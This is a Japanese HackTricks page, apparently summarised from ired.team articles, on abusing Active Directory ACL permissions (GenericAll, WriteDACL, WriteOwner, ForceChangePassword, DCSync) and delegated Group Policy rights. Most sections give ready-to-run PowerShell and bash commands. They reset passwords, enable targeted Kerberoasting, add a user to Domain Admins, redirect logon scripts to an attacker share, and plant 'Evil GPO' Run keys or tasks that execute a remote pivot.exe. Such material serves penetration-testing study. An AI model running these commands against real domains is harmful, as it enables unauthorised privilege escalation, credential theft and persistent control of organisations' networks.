# Active Directory ACL/ACEの悪用

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合**は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**する。
- **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて修正を迅速化します。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**このページは主に、[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)および[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)の技術からの要約です。詳細については、元の記事を確認してください。**

## **ユーザーに対するGenericAll権限**
この権限は、攻撃者に対して対象ユーザーアカウントの完全な制御を提供します。`GenericAll`権限が`Get-ObjectAcl`コマンドを使用して確認されると、攻撃者は次のことができます：

- **ターゲットのパスワードを変更する**：`net user <username> <password> /domain`を使用して、攻撃者はユーザーのパスワードをリセットできます。
- **ターゲットされたKerberoasting**：SPNをユーザーアカウントに割り当ててKerberoast可能にし、次にRubeusとtargetedKerberoast.pyを使用して、チケット発行チケット（TGT）ハッシュを抽出してクラックを試みることができます。
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **ターゲット指定されたASREPRoasting**: ユーザーの事前認証を無効にし、そのアカウントをASREPRoastingの攻撃対象にします。
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **グループのGenericAll権限**
この権限を持っている場合、攻撃者は`Domain Admins`のようなグループに対して`GenericAll`権限を持っている場合、グループメンバーシップを操作することができます。`Get-NetGroup`を使用してグループの識別名を特定した後、攻撃者は次のことができます：

- **自分自身をDomain Adminsグループに追加する**：これは直接コマンドを使用するか、Active DirectoryやPowerSploitのようなモジュールを使用して行うことができます。
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**
コンピュータオブジェクトまたはユーザーアカウントでこれらの特権を保持すると、次のことが可能になります：

- **Kerberosリソースベースの制約付き委任**：コンピュータオブジェクトを乗っ取ることができるようになります。
- **シャドウ資格情報**：このテクニックを使用して、シャドウ資格情報を作成する特権を悪用してコンピュータまたはユーザーアカウントを偽装することができます。

## **WriteProperty on Group**
特定のグループ（例：`Domain Admins`）のすべてのオブジェクトに対する`WriteProperty`権限を持っている場合、ユーザーは次のことができます：

- **自分自身をドメイン管理者グループに追加する**：`net user`と`Add-NetGroupUser`コマンドを組み合わせることで、この方法を使用してドメイン内で特権昇格を実現できます。
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **グループへの自己（自己メンバーシップ）**
この権限により、攻撃者は`Domain Admins`などの特定のグループに自分自身を追加することができます。次のコマンドシーケンスを使用すると、自己追加が可能です：
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty（自己メンバーシップ）**
同様の特権で、攻撃者は、グループのプロパティを変更する権限（`WriteProperty`）を持っている場合、直接自分自身をグループに追加することができます。この特権の確認と実行は、以下で行われます：
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
ユーザーの`User-Force-Change-Password`に対する`ExtendedRight`を保持することで、現在のパスワードを知らなくてもパスワードのリセットが可能になります。この権限の検証とその悪用は、PowerShellや代替のコマンドラインツールを使用して行うことができ、対話型セッションや非対話型環境向けのワンライナーを含む、ユーザーのパスワードをリセットするためのさまざまな方法が提供されます。コマンドは、シンプルなPowerShellの呼び出しからLinux上で`rpcclient`を使用するものまでさまざまで、攻撃ベクトルの多様性を示しています。
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **グループのWriteOwner**
攻撃者がグループに対して`WriteOwner`権限を持っていることがわかった場合、グループの所有権を自分自身に変更することができます。特に、対象のグループが`Domain Admins`である場合、所有権を変更することでグループ属性やメンバーシップに対する広範な制御が可能となります。このプロセスには、`Get-ObjectAcl`を使用して正しいオブジェクトを特定し、その後`Set-DomainObjectOwner`を使用して所有者をSIDまたは名前で変更することが含まれます。
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **ユーザーへのGenericWrite**
この権限を持つと、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite`アクセス権を使用すると、攻撃者はユーザーログオン時に悪意のあるスクリプトを実行するために、ターゲットユーザーのログオンスクリプトパスを変更できます。これは、`Set-ADObject`コマンドを使用して、ターゲットユーザーの`scriptpath`プロパティを攻撃者のスクリプトを指すように更新することで達成されます。
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GroupへのGenericWrite**
この権限を持つ攻撃者は、特定のグループに自分自身や他のユーザーを追加するなど、グループメンバーシップを操作することができます。このプロセスには、資格情報オブジェクトを作成し、それを使用してユーザーをグループから追加または削除し、PowerShellコマンドを使用してメンバーシップの変更を確認するという手順が含まれます。
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
ADオブジェクトを所有し、それに対する`WriteDACL`権限を持つことで、攻撃者はそのオブジェクトに対して`GenericAll`権限を自分自身に付与することができます。これはADSIの操作を通じて実現され、オブジェクトに対する完全な制御とグループメンバーシップの変更が可能となります。ただし、Active Directoryモジュールの`Set-Acl` / `Get-Acl`コマンドレットを使用してこれらの権限を悪用しようとする際には制限が存在します。
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **ドメイン上でのレプリケーション（DCSync）**
DCSync攻撃は、ドメイン上の特定のレプリケーション権限を利用して、ドメインコントローラーを模倣し、ユーザーの資格情報を含むデータを同期するものです。この強力なテクニックには、`DS-Replication-Get-Changes`のような権限が必要で、攻撃者はドメインコントローラーに直接アクセスせずに、AD環境から機密情報を抽出することができます。
[**DCSync攻撃について詳しくはこちらをご覧ください。**](../dcsync.md)







## GPO委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO委任

グループポリシーオブジェクト（GPO）を管理するための委任されたアクセスは、重大なセキュリティリスクを引き起こす可能性があります。たとえば、`offense\spotless`といったユーザーがGPO管理権限を委任されている場合、**WriteProperty**、**WriteDacl**、**WriteOwner**などの特権を持つかもしれません。これらの権限は、PowerViewを使用して特定され、悪用される可能性があります：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### GPO権限の列挙

誤構成されたGPOを特定するために、PowerSploitのコマンドレットを連鎖させることができます。これにより、特定のユーザーが管理権限を持つGPOを発見できます：
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**特定のポリシーが適用されたコンピューター**：特定のGPOが適用されているコンピューターを特定することで、潜在的な影響範囲を把握するのに役立ちます。
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**特定のコンピューターに適用されたポリシー**：特定のコンピューターに適用されているポリシーを確認するには、`Get-DomainGPO`などのコマンドを利用できます。

**特定のポリシーが適用されたOU**：特定のポリシーに影響を受ける組織単位（OU）を特定するには、`Get-DomainOU`を使用できます。

### GPOの悪用 - New-GPOImmediateTask

誤構成されたGPOは、コードを実行するために悪用される可能性があります。たとえば、即時スケジュールされたタスクを作成することで、影響を受けるマシンのローカル管理者グループにユーザーを追加することができ、特権を大幅に昇格させることができます：
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy モジュール - GPO の悪用

GroupPolicy モジュールは、インストールされている場合、新しい GPO の作成とリンク、およびレジストリ値などの設定を可能にし、影響を受けるコンピュータでバックドアを実行するための設定を行うことができます。この方法では、GPO を更新し、ユーザーがコンピュータにログインして実行する必要があります。
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPOの悪用

SharpGPOAbuseは、新しいGPOを作成する必要なく、既存のGPOを悪用する方法を提供します。このツールは、既存のGPOを変更するか、RSATツールを使用して新しいGPOを作成してから変更を適用する必要があります。
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### ポリシーの更新を強制する

通常、GPOの更新は約90分ごとに行われます。特に変更を実装した後、ターゲットコンピュータで`gpupdate /force`コマンドを使用して即時のポリシー更新を強制することができます。このコマンドにより、GPOへの変更が次の自動更新サイクルを待たずに適用されます。

### 内部構造

`Misconfigured Policy`などの特定のGPOのスケジュールされたタスクを調査すると、`evilTask`などのタスクの追加が確認できます。これらのタスクは、システムの動作を変更したり特権を昇格させることを目的としてスクリプトやコマンドラインツールを使用して作成されます。

`New-GPOImmediateTask`によって生成されたXML構成ファイルを調べると、スケジュールされたタスクの構造が明確になります。このファイルは、スケジュールされたタスクがどのように定義および管理されるかを示し、任意のコマンドやスクリプトを実行するための手段を提供します。

### ユーザーとグループ

GPOを使用すると、ターゲットシステム上のユーザーおよびグループのメンバーシップを操作することも可能です。攻撃者は、Users and Groupsポリシーファイルを直接編集することで、特権のあるグループ（例：`administrators`グループ）にユーザーを追加することができます。これは、GPO管理権限の委任により、新しいユーザーを追加したりグループのメンバーシップを変更したりすることが許可されるためです。

Users and GroupsのXML構成ファイルは、これらの変更がどのように実装されるかを示しています。このファイルにエントリを追加することで、特定のユーザーに影響を受けるシステム全体で昇格された特権が付与されることがあります。この方法は、GPOの操作を通じて特権昇格に直接アプローチする手段を提供します。

さらに、ログオン/ログオフスクリプトの活用、autorunsのためのレジストリキーの変更、.msiファイルを介したソフトウェアのインストール、サービス構成の編集など、コードの実行や持続性の維持のための追加の方法も考慮されます。これらのテクニックは、GPOの乱用を通じてアクセスを維持し、ターゲットシステムを制御するためのさまざまな手段を提供します。



## 参考文献

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて迅速に修正できます。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今日。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい** または **HackTricksをPDFでダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローしてください。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
